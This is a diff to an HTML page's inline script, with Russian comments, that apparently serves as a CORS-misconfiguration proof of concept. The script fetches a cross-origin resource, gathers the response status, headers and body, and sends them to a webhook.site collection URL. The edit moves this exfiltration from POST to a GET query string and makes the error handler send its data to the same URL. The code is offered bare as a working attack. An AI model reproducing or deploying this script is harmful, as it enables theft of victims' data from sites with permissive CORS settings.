@@ -14,7 +14,7 @@
   "credentials": "omit"
 })
   .then(res => {
-    // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!
+    // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!s
     return res.text().then(body => ({
       status: res.status,
       headers: [...res.headers.entries()],
@@ -22,20 +22,18 @@
     }));
   })
   .then(data => {
-    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e', {
-      method: 'POST',
-      body: JSON.stringify(data),
+    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+JSON.stringify(data), {
+      method: 'GET',
       headers: { 'Content-Type': 'application/json' }
     });
   })
-  .catch(err => {
-    // Если CORS блокирует — попадём сюда
-    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e', {
-      method: 'POST',
-      body: JSON.stringify({ error: err.toString() }),
+  .catch(data => {
+  
+    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+JSON.stringify(data), {
+      method: 'GET',
       headers: { 'Content-Type': 'application/json' }
     });
-  });
+  })
 </script>
 </body>
 </html>
